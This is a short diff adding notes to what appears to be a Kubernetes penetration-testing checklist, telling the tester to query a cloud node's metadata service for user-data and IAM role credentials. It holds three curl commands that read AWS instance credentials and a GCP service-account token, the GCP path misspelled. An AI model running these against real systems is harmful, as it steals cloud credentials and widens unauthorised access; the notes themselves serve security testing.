@@ -7,3 +7,11 @@ Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https:/
 [pod-priv-only.yaml](pod-priv-only.yaml)
 
  
+ 
+ If cloud hosted, look at the metadata service and checkout user-data, and the IAM permissions. If an IAM role has been assigned to the node, use that to see wht access you hav in the cloud environment. 
+
+```bash
+curl http://169.254.169.254/latest/user-data 
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/insce-accounts/default/token
+```
